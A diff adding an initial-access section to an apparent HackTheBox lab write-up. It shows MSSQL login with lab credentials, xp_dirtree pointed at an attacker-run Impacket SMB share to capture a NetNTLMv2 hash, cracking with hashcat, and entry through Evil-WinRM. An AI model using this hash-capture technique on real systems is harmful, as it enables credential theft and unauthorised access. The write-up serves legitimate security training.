@@ -360,4 +360,35 @@ With the gathered credentials I tried to perform the AS-REP roasting to checking
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/86abd543-ff8b-4d01-ae17-6df0d9c339dc)
 
+## Intital access:
+
+With the Guest credential I tried to access the SQL server using an Impacket script "mssqlclient.py"
+
+```
+python3 mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
+```
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2484dbe1-8969-4d29-9f29-af964c8d7626)
+
+After getting into SQL server I did perform some search on Google & found I can use 'xp_dirtree' command to access remote files from shares. So, if I will just start a SMB server & point the SQL server towards my network share then there is a possibility that while autheticating to SMB share the service account might expose it's hashed credential.
+
+I started SMBv2 server using another Impacket script & point the SQL server towards my SMB enabled host, which exposed the NetNTLMv2 hash in the response:
+
+```
+python3 impacket/examples/smbserver.py kill3r . -smb2support
+```
+
+```
+SQL> xp_dirtree '\\10.10.14.3\kill3r'
+```
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/188f1598-1202-4267-9902-af0eab6b63bf)
+
+I used 'hashcat' to crack the NetNTLMv2 hash & found the clear text password.
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c9043af9-e9bb-4cfa-8558-5c8e7bd7d0e7)
+
+Using the cracked credentials of 'sql_svc' service account I finally got the initial access into the host via Evil-WinRM: (pwn3d!🙂)
+
+![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5e7a5fa4-db30-4090-a511-5b56444e7d2b)
+
 
